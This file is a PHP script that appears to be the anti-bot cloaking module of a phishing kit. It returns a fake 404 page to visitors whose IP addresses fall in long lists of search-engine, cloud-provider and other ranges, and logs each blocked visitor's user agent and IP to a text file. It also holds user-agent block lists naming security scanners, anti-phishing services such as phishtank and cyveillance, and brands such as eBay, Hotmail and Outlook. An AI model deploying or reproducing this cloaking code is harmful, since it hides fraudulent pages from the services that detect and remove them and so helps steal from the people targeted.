<?
$id = $_SERVER['REMOTE_ADDR'];
$ips = array(
"^94.26.*.*", "^95.85.*.*", "^72.52.96.*", "^212.8.79.*", "^62.99.77.*", "^83.31.118.*", "^91.231.*.*", "^206.207.*.*", "^91.231.212.*", "^62.99.77.*", "^198.41.243.*", "^162.158.*.*", "^162.158.7.*", "^162.158.72.*", "^173.245.55.*", "^108.162.246.*", "^162.158.95.*", "^108.162.215.*", "^95.108.194.*", "^141.101.104.*", "^93.54.82.*", "^69.164.145.*", "^194.153.113.*", "^178.43.117.*", "^62.141.65.*", "^83.31.69.*", "^107.178.195.*", "^149.20.54.*", "^85.9.7.*", "^87.106.251.*", "^107.178.194.*", "^124.66.185.*", "^133.11.204.*", "^185.2.138.*", "^188.165.83.*", "^78.148.13.*", "^192.232.213.*", "^1.234.41.*", "^124.66.185.*", "^87.106.251.*", "^176.195.231.*", "^206.253.226.*", "^107.20.181.*", "^188.244.39.*", "^124.66.185.*", "^38.74.138.*", "^124.66.185.*", "^38.74.138.*", "^206.253.226.*", "^1.234.41.*", "^124.66.185.*", "^87.106.251.*", "^85.9.7.*", "^37.140.188.*", "^195.128.227.*", "^38.74.138.*", "^107.20.181.*", "^104.131.223.*", "^46.4.120.*", "^107.178.194.*", "^198.60.236.*", "^217.74.103.*", "^92.103.69.*", "^217.74.103.*", "^66.211.160.86*", "^46.244.*.*", "^131.*.*.*", "^157.*.*.*", "^202.*.*.*", "^204.*.*.*", "^207.*.*.*", "^213.*.*.*", "^219.*.*.*", "^63.*.*.*", "^64.*.*.*", "^65.*.*.*", "^68.*.*.*", "^64.*.*.*", "^64.233.160.*", "^64.233.191.*", "^64.233.191.255*",  "^66.102.*.*", "^66.249.*.*", "^72.14.*.*", "^74.125.*.*", "^209.85.*.*", "^216.239.*.*", "^64.4.*.*", "^65.52.*.*", "^131.253.*.*", "^157.54.*.*", "^207.46.*.*", "^207.68.*.*", "^8.12.*.*", "^66.196.*.*", "^66.228.*.*", "^67.195.*.*", "^68.142.*.*", "^72.30.*.*", "^74.6.*.*", "^98.136.*.*", "^202.160.*.*", "^209.191.*.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*",
);
foreach($ips as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
		header("HTTP/1.0 404 Not Found");
		$ip = getenv("REMOTE_ADDR");
		$file = fopen("001_bot.txt","a");
		fwrite($file," user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
		echo"<br>";
        echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
	 
$dp =  strtolower($_SERVER['HTTP_USER_AGENT']);
$blocked_words = array(
     "bot",
     "above",
     "google",
     "softlayer",
	 "amazonaws",
	 "cyveillance",
	 "phishtank",
	 "dreamhost",
	 "netpilot",
	 "calyxinstitute",
	 "tor-exit",
	 "apache-httpclient",
	 "lssrocketcrawler",
	 "crawler",
	 "urlredirectresolver",
	 "jetbrains",
	 "spam",
	 "windows 95",
	 "windows 98",
	 "acunetix",
	 "netsparker",
	 "007ac9",
	 "008",
	 "192.comagent",
	 "200pleasebot",
	 "360spider",
	 "4seohuntbot",
	 "50.nu",
	 "a6-indexer",
	 "admantx",
	 "amznkassocbot",
	 "aboundexbot",
	 "aboutusbot",
	 "abrave spider",
	 "accelobot",
	 "acoonbot",
	 "addthis.com",
	 "adsbot-google",
	 "ahrefsbot",
	 "alexabot",
	 "amagit.com",
	 "analytics",
	 "antbot",
	 "apercite",
	 "aportworm",
	 "EBAY",
	 "CL0NA",
	 "jabber",
	 "ebay",
	 "arabot",
	 "hotmail!",
	 "msn!",
	 "outlook!",
	 "outlook",
	 "msn",
	 "hotmail",
);
$Botname = array( // LIST BOOTS NAME
		 "bot",
		 "above",
		 "google",
		 "softlayer",
		 "amazonaws",
		 "cyveillance",
		 "compatible",
		 "facebook",
		 "phishtank",
		 "dreamhost",
		 "netpilot",
		 "calyxinstitute",
		 "tor-exit",
		 "apache-httpclient",
		 "lssrocketcrawler",
		 "Trident",
		 "X11",
		 "Macintosh",
		 "crawler",
		 "urlredirectresolver",
		 "jetbrains",
		 "spam",
		 "windows 95",
		 "windows 98",
		 "acunetix",
		 "netsparker",
		 "google",
		 "007ac9",
		 "008",
		 "192.comagent",
		 "200pleasebot",
		 "360spider",
		 "4seohuntbot",
		 "50.nu",
		 "a6-indexer",
		 "admantx",
		 "amznkassocbot",
		 "aboundexbot",
		 "aboutusbot",
		 "abrave spider",
		 "accelobot",
		 "acoonbot",
		 "addthis.com",
		 "adsbot-google",
		 "ahrefsbot",
		 "alexabot",
		 "amagit.com",
		 "analytics",
		 "antbot",
		 "apercite",
		 "aportworm",
		 "arabot",
		 "crawl",
		 "slurp",
		 "spider",
		 "seek",
		 "accoona",
		 "acoon",
		 "adressendeutschland",
		 "ah-ha.com",
		 "ahoy",
		 "altavista",
		 "ananzi",
		 "anthill",
		 "appie",
		 "arachnophilia",
		 "arale",
		 "araneo",
		 "aranha",
		 "architext",
		 "aretha",
		 "arks",
		 "asterias",
		 "atlocal",
		 "atn",
		 "atomz",
		 "augurfind",
		 "backrub",
		 "bannana_bot",
		 "baypup",
		 "bdfetch",
		 "big brother",
		 "biglotron",
		 "bjaaland",
		 "blackwidow",
		 "blaiz",
		 "blog",
		 "blo.",
		 "bloodhound",
		 "boitho",
		 "booch",
		 "bradley",
		 "butterfly",
		 "calif",
		 "cassandra",
		 "ccubee",
		 "cfetch",
		 "charlotte",
		 "churl",
		 "cienciaficcion",
		 "cmc",
		 "collective",
		 "comagent",
		 "combine",
		 "computingsite",
		 "csci",
		 "curl",
		 "cusco",
		 "daumoa",
		 "deepindex",
		 "delorie",
		 "depspid",
		 "deweb",
		 "die blinde kuh",
		 "digger",
		 "ditto",
		 "dmoz",
		 "docomo",
		 "download express",
		 "dtaagent",
		 "dwcp",
		 "ebiness",
		 "ebingbong",
		 "e-collector",
		 "ejupiter",
		 "emacs-w3 search engine",
		 "esther",
		 "evliya celebi",
		 "ezresult",
		 "falcon",
		 "felix ide",
		 "ferret",
		 "fetchrover",
		 "fido",
		 "findlinks",
		 "fireball",
		 "fish search",
		 "fouineur",
		 "funnelweb",
		 "gazz",
		 "gcreep",
		 "genieknows",
		 "getterroboplus",
		 "geturl",
		 "glx",
		 "goforit",
		 "bit.ly/",
		 "golem",
		 "grabber",
		 "grapnel",
		 "gralon",
		 "griffon",
		 "gromit",
		 "grub",
		 "gulliver",
		 "hamahakki",
		 "harvest",
		 "havindex",
		 "helix",
		 "heritrix",
		 "hku www octopus",
		 "homerweb",
		 "htdig",
		 "html index",
		 "html_analyzer",
		 "https://",
		 "htmlgobble",
		 "hubater",
		 "hyper-decontextualizer",
		 "ia_archiver",
		 "ibm_planetwide",
		 "ichiro",
		 "iconsurf",
		 "iltrovatore",
		 "image.kapsi.net",
		 "imagelock",
		 "incywincy",
		 "indexer",
		 "infobee",
		 "informant",
		 "ingrid",
		 "inktomisearch.com",
		 "inspector web",
		 "intelliagent",
		 "internet shinchakubin",
		 "ip3000",
		 "iron33",
		 "israeli-search",
		 "ivia",
		 "jack",
		 "jakarta",
		 "javabee",
		 "jetbot",
		 "jumpstation",
		 "katipo",
		 "kdd-explorer",
		 "kilroy",
		 "knowledge",
		 "kototoi",
		 "kretrieve",
		 "labelgrabber",
		 "lachesis",
		 "larbin",
		 "legs",
		 "libwww",
		 "linkalarm",
		 "link validator",
		 "linkscan",
		 "lockon",
		 "lwp",
		 "lycos",
		 "magpie",
		 "mantraagent",
		 "mapoftheinternet",
		 "marvin/",
		 "mattie",
		 "mediafox",
		 "mediapartners",
		 "mercator",
		 "merzscope",
		 "microsoft url control",
		 "minirank",
		 "miva",
		 "mj12",
		 "mnogosearch",
		 "moget",
		 "monster",
		 "moose",
		 "motor",
		 "multitext",
		 "muncher",
		 "muscatferret",
		 "mwd.search",
		 "myweb",
		 "najdi",
		 "nameprotect",
		 "nationaldirectory",
		 "nazilla",
		 "ncsa beta",
		 "nec-meshexplorer",
		 "nederland.zoek",
		 "netcarta webmap engine",
		 "netmechanic",
		 "netresearchserver",
		 "netscoop",
		 "newscan-online",
		 "nhse",
		 "nokia6682/",
		 "nomad",
		 "noyona",
		 "nutch",
		 "nzexplorer",
		 "objectssearch",
		 "occam",
		 "omni",
		 "open text",
		 "openfind",
		 "openintelligencedata",
		 "orb search",
		 "osis-project",
		 "pack rat",
		 "pageboy",
		 "pagebull",
		 "page_verifier",
		 "panscient",
		 "parasite",
		 "partnersite",
		 "patric",
		 "pear.",
		 "pegasus",
		 "peregrinator",
		 "pgp key agent",
		 "phantom",
		 "phpdig",
		 "picosearch",
		 "piltdownman",
		 "pimptrain",
		 "pinpoint",
		 "pioneer",
		 "piranha",
		 "plumtreewebaccessor",
		 "pogodak",
		 "poirot",
		 "pompos",
		 "poppelsdorf",
		 "poppi",
		 "popular iconoclast",
		 "psycheclone",
		 "publisher",
		 "python",
		 "rambler",
		 "raven search",
		 "roach",
		 "road runner",
		 "roadhouse",
		 "robbie",
		 "robofox",
		 "robozilla",
		 "rules",
		 "salty",
		 "sbider",
		 "scooter",
		 "scoutjet",
		 "scrubby",
		 "search.",
		 "searchprocess",
		 "semanticdiscovery",
		 "senrigan",
		 "sg-scout",
		 "shai'hulud",
		 "shark",
		 "shopwiki",
		 "sidewinder",
		 "sift",
		 "silk",
		 "simmany",
		 "site searcher",
		 "site valet",
		 "sitetech-rover",
		 "skymob.com",
		 "sleek",
		 "smartwit",
		 "sna-",
		 "snappy",
		 "snooper",
		 "sohu",
		 "speedfind",
		 "sphere",
		 "sphider",
		 "spinner",
		 "spyder",
		 "steeler/",
		 "suke",
		 "suntek",
		 "supersnooper",
		 "surfnomore",
		 "sven",
		 "sygol",
		 "szukacz",
		 "tach black widow",
		 "tarantula",
		 "templeton",
		 "/teoma",
		 "t-h-u-n-d-e-r-s-t-o-n-e",
		 "theophrastus",
		 "titan",
		 "titin",
		 "tkwww",
		 "toutatis",
		 "t-rex",
		 "tutorgig",
		 "twiceler",
		 "twisted",
		 "ucsd",
		 "udmsearch",
		 "url check",
		 "updated",
		 "vagabondo",
		 "valkyrie",
		 "verticrawl",
		 "victoria",
		 "vision-search",
		 "volcano",
		 "voyager/",
		 "voyager-hc",
		 "w3c_validator",
		 "w3m2",
		 "w3mir",
		 "walker",
		 "wallpaper",
		 "wanderer",
		 "wauuu",
		 "wavefire",
		 "web core",
		 "web hopper",
		 "web wombat",
		 "webbandit",
         "webcatcher",
		 "webcopy",
		 "webfoot",
		 "weblayers",
		 "weblinker",
		 "weblog monitor",
		 "webmirror",
		 "webmonkey",
		 "webquest",
		 "webreaper",
		 "websitepulse",
		 "websnarf",
		 "webstolperer",
		 "webvac",
		 "webwalk",
		 "webwatch",
		 "webwombat",
		 "webzinger",
		 "wget",
		 "2NgrFfG",
		 "whizbang",
		 "whowhere",
		 "wild ferret",
		 "worldlight",
		 "wwwc",
		 "wwwster",
		 "xenu",
		 "xift",
		 "xirq",
		 "yandex",
		 "yanga",
		 "yeti",
		 "yahoo!");

?>